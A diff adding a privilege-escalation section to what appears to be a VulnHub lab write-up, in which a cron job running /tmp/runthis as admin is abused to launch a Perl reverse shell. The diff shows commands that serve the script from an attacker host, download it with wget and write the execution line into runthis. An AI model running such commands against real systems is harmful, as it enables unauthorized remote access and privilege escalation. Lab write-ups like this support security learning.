@@ -123,8 +123,37 @@ as it seems in this note admin provides us afew capabilities :
 - we can run all binaries in `/usr/bin/`
 - we can run afew binaries in `/home/admin/`
 - we should create a file called `runthis` in `/tmp/` and put our commands into this file
-- runthis file will be executed with admin privileges every one minute
+- the "runthis" file will be executed with admin privileges every one minute
 - the result will be saved in `cronresult` file
+
+so what is better than another reverse shell ?
+
+## Privilege Escalation to admin user
+
+i prepared another reverse shell, this time a perl reverse shell in my kali machine
+
+because `perl` binary exist in `/usr/bin` directory and we can execute it :
+
+```bash
+root@kali: ls
+revshell.pl
+root@kali: python -m http.server 80
+bash-4.1$ cd /tmp
+bash-4.1$ wget http://192.168.127.128/revshell.pl
+bash-4.1$ echo '/usr/bin/perl /tmp/revshell.pl' > runthis
+```
+
+and yes we got the shell with admin privileges :
+
+
+![shell2](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1c6d7bc4-3db4-4e55-82d6-3cc29d66cabf)
+
+
+
+
+
+
+
 
 
 
